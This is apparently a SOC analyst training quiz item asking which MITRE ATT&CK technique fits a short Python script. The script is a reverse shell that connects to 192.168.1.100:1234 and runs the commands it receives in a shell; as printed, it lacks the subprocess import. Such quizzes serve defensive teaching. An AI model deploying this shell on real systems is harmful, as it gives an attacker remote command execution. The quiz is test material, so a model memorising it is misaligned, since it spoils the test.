# **Challenge 1.8.3: MITRE ATT&CK Framework (Basics)**

---

### **description:**

🔍 You are a Level 1 SOC Analyst and have been asked to analyze a suspicious script found on a compromised system. The script appears to be used for command and control communication:

---
```plaintext
import socket

host = "192.168.1.100"
port = 1234

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

while True:
    command = s.recv(1024).decode("utf-8")
    if command == "quit":
        break
    else:
        output = subprocess.check_output(command, shell=True)
        s.send(output)

s.close()
```
🤔 Question:

Identify the MITRE ATT&CK technique most likely associated with this script.

🔘 ```A. T1043 - Commonly Used Port```

🔘 ```B. T1027 - Obfuscated Files or Information```

🔘 ```C. T1071 - Application Layer Protocol```

🔘 ```D. T1105 - Ingress Tool Transfer```

💡 Hint: Analyze the script's behavior and the method of communication to identify the MITRE ATT&CK technique.

🚀 Ready to answer? Go on and make your choice!